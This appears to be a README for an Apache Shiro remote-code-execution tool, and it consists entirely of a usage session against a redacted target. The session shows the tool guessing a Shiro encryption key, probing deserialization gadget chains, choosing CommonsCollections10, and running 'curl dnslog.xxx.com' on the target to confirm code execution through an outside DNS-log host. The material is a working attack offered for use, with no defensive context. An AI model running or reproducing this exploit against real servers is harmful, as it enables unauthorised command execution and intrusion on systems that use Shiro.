# shiro_rce

```
[admin@ shiro]java -cp shiro_tool.jar Shiro https://xx.xx.xx.xx/          
[-] target: https://xx.xx.xx.xx/
[-] target is use shiro
[-] start guess shiro key.
[-] shiro key: kPH+bIxk5D2deZiIxcaaaA==
[-] check URLDNS
[*] find: URLDNS can be use
[*] URLDNS command format: http://dnslog.xxx.com
[-] check CommonsBeanutils1
[-] check CommonsCollections1
[-] check CommonsCollections2
[-] check CommonsCollections3
[-] check CommonsCollections4
[-] check CommonsCollections5
[-] check CommonsCollections6
[-] check CommonsCollections7
[-] check CommonsCollections8
[-] check CommonsCollections9
[-] check CommonsCollections10
[*] find: CommonsCollections10 can be use
[-] check Groovy1
[-] check JSON1
[-] check Spring1
[-] check Spring2
[-] check JRMPClient
[*] find: JRMPClient can be use
[*] JRMPClient please use: java -cp shiro_tool.jar ysoserial.exploit.JRMPListener 
0: URLDNS
1: CommonsCollections10
2: JRMPClient
[-] please enter the number(0-2)
1
[-] use gadget: CommonsCollections10
[-] please enter command, input q or quit to quit
curl dnslog.xxx.com
[-] start process command: curl dnslog.xxx.com
[-] please enter command, input q or quit to quit
quit
[-] start process command: quit
[-] exit

```
